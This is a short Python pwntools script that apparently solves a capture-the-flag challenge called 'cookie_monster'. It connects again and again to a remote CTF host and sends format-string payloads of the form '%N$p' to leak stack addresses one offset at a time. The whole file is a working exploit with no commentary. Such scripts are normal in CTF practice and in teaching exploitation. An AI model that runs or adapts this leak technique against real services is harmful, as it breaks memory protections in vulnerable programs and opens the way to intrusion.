from pwn import *

#p=process("./cookie_monster")

for num in range(1,40):
	p=remote('ctf.umbccd.io', 4300)
	payload = "|%"+str(num)+"$p|"
	p.sendlineafter('2. Tell everyone not to panic. It\'s just the Fake News media freaking out.\n',payload)
	stack =  p.recvline().split('|')[1]
	if stack == "(nil)":
		continue;
	addr = int(stack,16)
	print "leaked addr"+str(num)+": "+hex(addr)
	p.close()
	p.shutdown()